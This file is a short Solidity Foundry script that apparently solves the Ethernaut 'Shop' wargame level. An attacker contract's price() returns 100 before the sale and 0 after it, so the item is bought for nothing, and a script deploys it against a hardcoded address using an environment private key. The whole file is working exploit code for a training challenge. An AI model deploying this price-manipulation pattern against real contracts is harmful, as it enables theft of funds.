// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Shop.sol";
import {Script} from "forge-std/Script.sol";

contract AttackBuyer {
    Shop shop;

    constructor(address _address) {
        shop = Shop(_address);
    }

    function attack() public {
        shop.buy();
    }

    function price() public view returns (uint256) {
        if (shop.isSold()) {
            return 0;
        } else {
            return 100;
        }
    }
}

contract ShopAttack is Script {
    Shop public shop = Shop(0x51eFF39EBB447D156e4AA129786613aC198BD406);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        AttackBuyer attackBuyer = new AttackBuyer(address(shop));

        attackBuyer.attack();

        vm.stopBroadcast();
    }
}